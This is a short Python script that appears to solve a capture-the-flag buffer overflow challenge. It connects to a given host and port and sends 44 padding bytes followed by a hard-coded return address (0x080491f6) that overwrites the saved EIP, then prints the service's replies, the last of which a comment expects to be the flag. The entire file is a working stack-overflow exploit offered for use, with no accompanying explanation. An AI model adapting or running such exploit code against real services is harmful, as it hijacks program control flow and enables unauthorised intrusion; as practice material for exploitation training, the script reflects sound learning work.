#!/usr/bin/env python3

import socket
import argparse
import struct

# 'struct' package usage example
# new_eip = struct.pack(
#   "<I", 0x080491f6
# )

parser = argparse.ArgumentParser()
# Hostname
parser.add_argument(
  "host", type=str,
  help="The hostname or the IP address to connect to"
)
# Port
parser.add_argument(
  "port", type=int,
  help="The port for the service to connect to"
)

args = parser.parse_args()
# print(args.host, args.port)

# Distance EIP - beginning of the buffer; new EIP value
offset = 44
new_eip = b'\xf6\x91\x04\x08'

payload = b''.join(
  [
    b'A' * 44,
    new_eip,
  ]
)

payload += b'\n'

with socket.socket() as connection:
  connection.connect((args.host, args.port))
  print(connection.recv(4096).decode("utf-8"))
  connection.send(payload)

  # Receive the first answer
  print(connection.recv(4096).decode("utf-8"))

  # Receive the flag
  print(connection.recv(4096).decode("utf-8"))

  connection.close()

